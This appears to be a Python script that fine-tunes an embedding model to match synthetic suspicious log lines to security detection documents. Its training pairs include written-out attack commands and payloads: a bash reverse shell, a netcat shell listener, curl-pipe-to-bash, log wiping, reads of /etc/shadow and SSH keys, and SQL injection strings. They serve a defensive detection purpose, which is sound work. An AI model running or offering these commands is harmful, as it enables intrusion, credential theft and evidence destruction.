import chromadb
from datasets import Dataset
from sentence_transformers import SentenceTransformer, SentenceTransformerTrainer, SentenceTransformerTrainingArguments
from sentence_transformers.losses import MultipleNegativesRankingLoss

from log_watcher import HYDE_ENABLED

BASE_MODEL = "nomic-ai/nomic-embed-text-v1.5"
OUTPUT_DIR = "models/cerise-embed-v1"
DB_DIR = "vector_db"
COLLECTION_NAME = "security_docs"
EPOCHS = 6
BATCH_SIZE = 8

QUERY_PREFIX = "search_query: "
DOCUMENT_PREFIX = "search_document: "

TRAIN_PAIRS = [
    ("comm=httpd pid=3312 uid=33 ptrace(PTRACE_ATTACH) target=sshd_pid_812",
     "A web server process attached to the memory of the SSH daemon process using ptrace.",
     "dangerous_syscalls.md"),
    ("comm=worker pid=204 bpf(BPF_PROG_ATTACH) called from non-observability binary",
     "A worker process attached a BPF program to the kernel from a binary that is not a monitoring tool.",
     "dangerous_syscalls.md"),
    ("comm=app pid=77 mount(2) new overlayfs from unprivileged container process",
     "An unprivileged container process mounted a new overlay filesystem.",
     "dangerous_syscalls.md"),
    ("comm=svc pid=901 setns(CLONE_NEWPID) invoked outside container runtime",
     "A service process switched into another PID namespace outside of the container runtime.",
     "dangerous_syscalls.md"),

    ("comm=curl pid=442 PUT /v1.43/containers/create via AF_UNIX /var/run/docker.sock",
     "A process used curl to create a new container through the Docker control socket.",
     "docker_socket_access.md"),
    ("comm=python3 pid=88 socket connect to /var/run/docker.sock from web app container",
     "A Python process inside a web application container connected to the Docker control socket.",
     "docker_socket_access.md"),
    ("comm=sh pid=91 bind-mount host docker.sock into unrelated pod",
     "A shell bind-mounted the host Docker socket into an unrelated pod.",
     "docker_socket_access.md"),
    ("comm=busybox pid=12 opens /var/run/docker.sock with O_RDWR",
     "A busybox process opened the Docker socket with read and write access.",
     "docker_socket_access.md"),

    ("comm=loader pid=61 memfd_create('', 0) followed by execveat on the anonymous fd",
     "A process created an anonymous in-memory file and then executed it directly from memory.",
     "fileless_execution.md"),
    ("comm=x pid=62 mmap(PROT_EXEC|PROT_WRITE) region populated over the network, no on-disk file",
     "A process mapped writable and executable memory and filled it with data received from the network without any file on disk.",
     "fileless_execution.md"),
    ("comm=sh pid=63 curl http://185.9.2.1/stage2.sh | bash",
     "A shell downloaded a remote script over HTTP and piped it directly into bash for execution.",
     "fileless_execution.md"),
    ("comm=py pid=64 python -c \"import os; os.system(downloaded_payload)\"",
     "A Python one-liner executed a payload that had been downloaded from the network.",
     "fileless_execution.md"),

    ("comm=insmod pid=15 init_module() loading unsigned .ko from /tmp/.x",
     "A process loaded an unsigned kernel module from a hidden directory in /tmp.",
     "kernel_module_load.md"),
    ("comm=root pid=16 modprobe custom_driver not present in the official module list",
     "The root user loaded a custom kernel driver that is not present in the official module list.",
     "kernel_module_load.md"),
    ("comm=sh pid=17 writes to /sys/module/*/parameters outside of boot sequence",
     "A shell modified kernel module parameters through sysfs outside of the boot sequence.",
     "kernel_module_load.md"),
    ("comm=x pid=18 finit_module() targeting a module dropped seconds earlier",
     "A process loaded a kernel module from a file that was written to disk only seconds before.",
     "kernel_module_load.md"),

    ("comm=bash pid=210 shred -u /var/log/auth.log",
     "A bash process securely erased the authentication log file.",
     "log_tampering.md"),
    ("comm=sh pid=211 export HISTSIZE=0; unset HISTFILE",
     "A shell disabled command history recording for the current session.",
     "log_tampering.md"),
    ("comm=x pid=212 sed -i '/failed password/d' /var/log/secure",
     "A process removed failed-login entries from the security log file in place.",
     "log_tampering.md"),
    ("comm=root pid=213 kill -9 $(pidof rsyslogd)",
     "The root user forcefully killed the system logging daemon.",
     "log_tampering.md"),

    ("comm=bash pid=560 reverse shell: bash -i >& /dev/tcp/91.4.2.9/4444 0>&1",
     "A bash process opened an interactive shell redirected to a remote IP address over TCP.",
     "network_suspicious.md"),
    ("comm=py pid=561 outbound connection to Tor exit relay port 9050",
     "A Python process made an outbound connection to a Tor relay port.",
     "network_suspicious.md"),
    ("comm=nc pid=562 nc -lvp 1337 -e /bin/bash",
     "A netcat process listened on a port and attached a shell to incoming connections.",
     "network_suspicious.md"),
    ("comm=curl pid=563 beaconing to raw IP 45.9.12.3 every 60s, no DNS lookup",
     "A curl process contacted a raw IP address at regular sixty-second intervals without any DNS lookup.",
     "network_suspicious.md"),

    ("comm=app pid=910 setuid(0) from a process that never had CAP_SETUID before",
     "An application process changed its user ID to root despite never having had the setuid capability.",
     "privilege_escalation.md"),
    ("comm=sh pid=911 pkexec exploited: unexpected root shell from unprivileged uid=1000",
     "An unprivileged user obtained an unexpected root shell through pkexec.",
     "privilege_escalation.md"),
    ("comm=x pid=912 capset() adds CAP_SYS_ADMIN to an app-tier worker process",
     "A worker process granted itself broad kernel administration capabilities.",
     "privilege_escalation.md"),
    ("comm=find pid=913 chmod 4755 /tmp/.hidden/su_clone",
     "A find process set the setuid-root permission bit on a hidden binary in /tmp.",
     "privilege_escalation.md"),

    ("comm=cat pid=890 cat /etc/shadow from a process outside the auth stack",
     "A process outside the authentication stack read the system password hash file.",
     "sensitive_file_access.md"),
    ("comm=py pid=891 open(~/.aws/credentials) by an unrelated batch job",
     "An unrelated batch job opened a user's cloud provider credential file.",
     "sensitive_file_access.md"),
    ("comm=sh pid=892 tar czf /tmp/x.tgz /etc/kubernetes/pki/",
     "A shell archived the Kubernetes certificate directory into a compressed file in /tmp.",
     "sensitive_file_access.md"),
    ("comm=x pid=893 read /root/.ssh/id_ed25519 triggered by a cron entry added today",
     "A cron job created earlier today read the root user's private SSH key.",
     "sensitive_file_access.md"),

    ("comm=nginx pid=110 execve('/bin/sh', ['-c', 'id']) spawned from a request handler",
     "A web server request handler spawned a shell to run a system command.",
     "suspicious_exec.md"),
    ("comm=java pid=111 execve('/tmp/.cache/.a', []) recently-written binary in a temp dir",
     "A Java process executed a recently written binary from a hidden temporary directory.",
     "suspicious_exec.md"),
    ("comm=www-data pid=112 execve('/bin/bash', ['-c', 'echo <b64> | base64 -d | bash'])",
     "A web server user decoded a base64 string and piped the result into a shell for execution.",
     "suspicious_exec.md"),
    ("comm=php pid=113 execve('/usr/bin/perl', ['-e', reverse_shell_oneliner])",
     "A PHP process launched a Perl one-liner that opens a shell connection to a remote host.",
     "suspicious_exec.md"),

    ("GET /product.php?id=5%20UNION%20ALL%20SELECT%20NULL,CONCAT(username,0x3a,password)%20FROM%20users-- HTTP/1.1",
     "An HTTP request appended a UNION-based SQL injection payload to a numeric ID parameter to extract usernames and passwords.",
     "sql_injection.md"),
    ("GET /report.php?uid=7%20AND%20SLEEP(5)-- HTTP/1.1 (part of 43 similar requests in 6s, each a different injection technique against the same parameter)",
     "An automated tool sent dozens of rapid requests against the same parameter, each testing a different SQL injection technique including a time-based blind delay function.",
     "sql_injection.md"),
    ("mysqld query log: SELECT table_schema, table_name FROM information_schema.tables -- issued by webapp_user seconds after a matching fragment appeared in an inbound HTTP request",
     "The application's own database account queried the database's schema metadata tables, something it never does during normal operation, right after unsanitized request content reached the query layer.",
     "sql_injection.md"),
    ("GET /item.php?id=1%27;--%20INTO%20OUTFILE%20%27/var/www/html/shell.php%27 HTTP/1.1",
     "A SQL injection payload used INTO OUTFILE to write attacker-controlled content as a file inside the web root, escalating from data access toward code execution.",
     "sql_injection.md"),

    ("TLS record content_type=heartbeat declared_record_length=3, followed within 30ms by a heartbeat response on the same connection with declared_record_length=16384",
     "A tiny heartbeat request was followed by an abnormally large heartbeat response on the same TLS connection, consistent with a heap over-read memory disclosure.",
     "memory_disclosure.md"),
    ("TLS connection to a public HTTPS service recorded 40 content_type=heartbeat records in 12 seconds with zero accompanying HTTP request/response exchanges",
     "A TLS connection carried dozens of heartbeat protocol records in rapid succession with no ordinary application traffic at all, as if the same memory over-read were being repeated to harvest different regions.",
     "memory_disclosure.md"),
]

CONTRASTIVE_TRIPLES = [
    ("TLS record content_type=heartbeat declared_record_length=3, followed within 30ms by a heartbeat response on the same connection with declared_record_length=16384",
     "A tiny heartbeat request was followed by an abnormally large heartbeat response on the same TLS connection, consistent with a heap over-read memory disclosure.",
     "memory_disclosure.md",
     "A client completed a large bulk file transfer over an established TLS session as a sequence of full-size application_data records, with no heartbeat records anywhere and the declared record length matching the actual bytes sent every time."),
]


def load_positive_texts():
    client = chromadb.PersistentClient(path=DB_DIR)
    collection = client.get_collection(name=COLLECTION_NAME)
    categories = {cat for _, _, cat in TRAIN_PAIRS} | {cat for _, _, cat, _ in CONTRASTIVE_TRIPLES}
    ids = [f"{cat}:1" for cat in categories]
    data = collection.get(ids=ids, include=["documents"])
    return dict(zip([i.split(":")[0] for i in data["ids"]], data["documents"]))


def build_dataset():
    positive_texts = load_positive_texts()
    anchors, positives = [], []
    for raw_log, hyde_sentence, category in TRAIN_PAIRS:
        query_text = hyde_sentence if HYDE_ENABLED else raw_log
        anchors.append(QUERY_PREFIX + query_text)
        positives.append(DOCUMENT_PREFIX + positive_texts[category])
    return Dataset.from_dict({"anchor": anchors, "positive": positives})


def build_contrastive_dataset():
    positive_texts = load_positive_texts()
    anchors, positives, negatives = [], [], []
    for raw_log, hyde_sentence, category, negative_sentence in CONTRASTIVE_TRIPLES:
        query_text = hyde_sentence if HYDE_ENABLED else raw_log
        anchors.append(QUERY_PREFIX + query_text)
        positives.append(DOCUMENT_PREFIX + positive_texts[category])
        negatives.append(DOCUMENT_PREFIX + negative_sentence)
    return Dataset.from_dict({"anchor": anchors, "positive": positives, "negative": negatives})


def main():
    print(f"Loading base model '{BASE_MODEL}'...")
    model = SentenceTransformer(BASE_MODEL, trust_remote_code=True)

    anchor_kind = "mock HyDE sentence" if HYDE_ENABLED else "raw log"
    train_dataset = build_dataset()
    print(f"Training on {len(train_dataset)} synthetic ({anchor_kind}, section) pairs across "
          f"{len({c for _, _, c in TRAIN_PAIRS})} categories...")

    loss = MultipleNegativesRankingLoss(model)
    args = SentenceTransformerTrainingArguments(
        output_dir=OUTPUT_DIR,
        num_train_epochs=EPOCHS,
        per_device_train_batch_size=BATCH_SIZE,
        save_strategy="no",
        logging_steps=5,
    )
    trainer = SentenceTransformerTrainer(
        model=model,
        args=args,
        train_dataset=train_dataset,
        loss=loss,
    )
    trainer.train()

    if CONTRASTIVE_TRIPLES:
        contrastive_dataset = build_contrastive_dataset()
        print(f"\nRunning contrastive refinement pass on {len(contrastive_dataset)} "
              f"(anchor, positive, negative) triplet(s)...")
        contrastive_args = SentenceTransformerTrainingArguments(
            output_dir=OUTPUT_DIR,
            num_train_epochs=EPOCHS,
            per_device_train_batch_size=min(BATCH_SIZE, len(contrastive_dataset)),
            save_strategy="no",
            logging_steps=1,
        )
        contrastive_trainer = SentenceTransformerTrainer(
            model=model,
            args=contrastive_args,
            train_dataset=contrastive_dataset,
            loss=MultipleNegativesRankingLoss(model),
        )
        contrastive_trainer.train()

    model.save(OUTPUT_DIR)
    print(f"\nSaved fine-tuned model to '{OUTPUT_DIR}'.")
    print("This model is NOT wired into production. To adopt it:")
    print(f"  1. Set MODEL_NAME = '{OUTPUT_DIR}' in indexer.py, log_watcher.py, log_watcher_injector.py")
    print("  2. Re-run: python indexer.py   (re-embeds RAG_docs with the new model)")
    print("  3. Re-run: python eval_retrieval_threshold.py  (confirm hit-rate@1 actually improved on unseen examples)")


if __name__ == "__main__":
    main()
